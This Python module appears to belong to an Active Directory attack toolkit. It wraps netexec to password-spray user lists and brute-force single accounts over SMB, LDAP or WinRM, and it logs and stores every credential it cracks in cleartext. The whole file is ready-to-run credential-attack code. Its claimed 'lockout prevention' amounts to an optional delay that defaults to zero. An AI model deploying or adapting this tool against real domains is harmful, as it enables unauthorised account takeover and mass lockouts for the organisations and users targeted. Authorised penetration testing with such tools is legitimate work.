"""
Implementation of password-based attacks against Active Directory.
Leverages netexec for efficient password spraying and bruteforce attacks
with built-in lockout prevention and multiple protocol support.
"""

from typing import List, Dict, Optional, Callable
from .attack_base import AttackBase
import subprocess
import threading
import time
import json
from datetime import datetime

class PasswordAttacks(AttackBase):
    def __init__(self):
        super().__init__()
        self.stop_attack = False
        self.attack_thread = None
        self.results = {
            'successful': [],
            'failed': [],
            'errors': []
        }
        
    def password_spray(self, target: str, domain: str, userlist: List[str], 
                      password: str, protocol: str = 'smb', delay: int = 0,
                      callback: Optional[Callable] = None) -> bool:
        """
        Perform password spraying using netexec
        
        Args:
            target: Target domain/DC
            domain: Domain name
            userlist: List of usernames to try
            password: Password to spray
            protocol: Protocol to use (smb/ldap/winrm)
            delay: Delay between attempts in seconds
            callback: Optional callback for real-time updates
        """
        self.stop_attack = False
        self.results = {'successful': [], 'failed': [], 'errors': []}
        
        def spray_thread():
            try:
                # Write userlist to temporary file
                with open('/tmp/userlist.txt', 'w') as f:
                    f.write('\n'.join(userlist))
                
                # Build netexec command
                cmd = [
                    'netexec', protocol, target,
                    '-u', '/tmp/userlist.txt',
                    '-p', password,
                    '--no-bruteforce',
                    '--continue-on-success',
                    '--json'
                ]
                
                if delay > 0:
                    cmd.extend(['--delay', str(delay)])
                
                # Execute netexec
                self.log_status(f"Starting password spray against {target} using {protocol}")
                process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                
                while not self.stop_attack:
                    output = process.stdout.readline()
                    if not output and process.poll() is not None:
                        break
                        
                    if output:
                        try:
                            result = json.loads(output)
                            if result.get('type') == 'success':
                                cred = {
                                    'username': result['username'],
                                    'password': password,
                                    'target': target,
                                    'protocol': protocol,
                                    'domain': domain,
                                    'timestamp': datetime.now().isoformat()
                                }
                                self.results['successful'].append(cred)
                                
                                # Save to database
                                self.db.add_credential(
                                    username=result['username'],
                                    password=password,
                                    domain=domain,
                                    source=f"Password spray ({protocol})",
                                    target=target
                                )
                                
                                # Real-time callback
                                if callback:
                                    callback('success', cred)
                                self.log_success(f"Found valid credentials - {result['username']}:{password}")
                                
                            elif result.get('type') == 'failed':
                                self.results['failed'].append(result['username'])
                                if callback:
                                    callback('failed', {'username': result['username']})
                                
                            elif result.get('type') == 'error':
                                error_msg = result.get('error', 'Unknown error')
                                self.results['errors'].append(error_msg)
                                if callback:
                                    callback('error', {'error': error_msg})
                                self.log_error(error_msg)
                                
                            # Additional status updates
                            if result.get('type') == 'progress':
                                if callback:
                                    callback('progress', result)
                                
                        except json.JSONDecodeError:
                            # Handle non-JSON output (progress updates etc)
                            if callback:
                                callback('status', output.decode().strip())
                
                process.terminate()
                
                # Log final summary
                self.log_success(
                    f"Password spray complete:\n"
                    f"- Successful: {len(self.results['successful'])}\n"
                    f"- Failed: {len(self.results['failed'])}\n"
                    f"- Errors: {len(self.results['errors'])}"
                )
                
            except Exception as e:
                self.log_error(f"Password spray error: {str(e)}")
                if callback:
                    callback('error', {'error': str(e)})
            finally:
                # Cleanup
                try:
                    import os
                    os.remove('/tmp/userlist.txt')
                except:
                    pass
                    
        self.attack_thread = threading.Thread(target=spray_thread)
        self.attack_thread.start()
        return True
        
    def bruteforce(self, target: str, domain: str, username: str, 
                   passwordlist: List[str], protocol: str = 'smb', 
                   delay: int = 0, callback: Optional[Callable] = None) -> bool:
        """
        Perform bruteforce attack using netexec
        
        Args:
            target: Target domain/DC
            domain: Domain name
            username: Username to test
            passwordlist: List of passwords to test
            protocol: Protocol to use (smb/ldap/winrm)
            delay: Delay between attempts in seconds
            callback: Optional callback for real-time updates
        """
        self.stop_attack = False
        self.results = {'successful': [], 'failed': [], 'errors': []}
        
        def bruteforce_thread():
            try:
                # Write password list to temporary file
                with open('/tmp/passlist.txt', 'w') as f:
                    f.write('\n'.join(passwordlist))
                
                # Build netexec command
                cmd = [
                    'netexec', protocol, target,
                    '-u', username,
                    '-p', '/tmp/passlist.txt',
                    '--no-password-spraying',
                    '--continue-on-success',
                    '--json'
                ]
                
                if delay > 0:
                    cmd.extend(['--delay', str(delay)])
                
                # Execute netexec
                self.log_status(f"Starting bruteforce for {username} using {protocol}")
                process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                
                while not self.stop_attack:
                    output = process.stdout.readline()
                    if not output and process.poll() is not None:
                        break
                        
                    if output:
                        try:
                            result = json.loads(output)
                            if result.get('type') == 'success':
                                password = result.get('password')
                                cred = {
                                    'username': username,
                                    'password': password,
                                    'target': target,
                                    'protocol': protocol,
                                    'domain': domain,
                                    'timestamp': datetime.now().isoformat()
                                }
                                self.results['successful'].append(cred)
                                
                                # Save to database
                                self.db.add_credential(
                                    username=username,
                                    password=password,
                                    domain=domain,
                                    source=f"Bruteforce ({protocol})",
                                    target=target
                                )
                                
                                # Real-time callback
                                if callback:
                                    callback('success', cred)
                                self.log_success(f"Found valid password for {username}: {password}")
                                
                            elif result.get('type') == 'failed':
                                self.results['failed'].append(result.get('password'))
                                if callback:
                                    callback('failed', {'password': result.get('password')})
                                
                            elif result.get('type') == 'error':
                                error_msg = result.get('error', 'Unknown error')
                                self.results['errors'].append(error_msg)
                                if callback:
                                    callback('error', {'error': error_msg})
                                self.log_error(error_msg)
                                
                            # Additional status updates
                            if result.get('type') == 'progress':
                                if callback:
                                    callback('progress', result)
                                
                        except json.JSONDecodeError:
                            # Handle non-JSON output
                            if callback:
                                callback('status', output.decode().strip())
                
                process.terminate()
                
                # Log final summary
                self.log_success(
                    f"Bruteforce complete:\n"
                    f"- Successful: {len(self.results['successful'])}\n"
                    f"- Failed: {len(self.results['failed'])}\n"
                    f"- Errors: {len(self.results['errors'])}"
                )
                
            except Exception as e:
                self.log_error(f"Bruteforce error: {str(e)}")
                if callback:
                    callback('error', {'error': str(e)})
            finally:
                # Cleanup
                try:
                    import os
                    os.remove('/tmp/passlist.txt')
                except:
                    pass
                    
        self.attack_thread = threading.Thread(target=bruteforce_thread)
        self.attack_thread.start()
        return True
        
    def stop(self) -> None:
        """Stop any running password attacks"""
        self.stop_attack = True
        if self.attack_thread and self.attack_thread.is_alive():
            self.attack_thread.join()
            self.log_status("Password attack stopped") 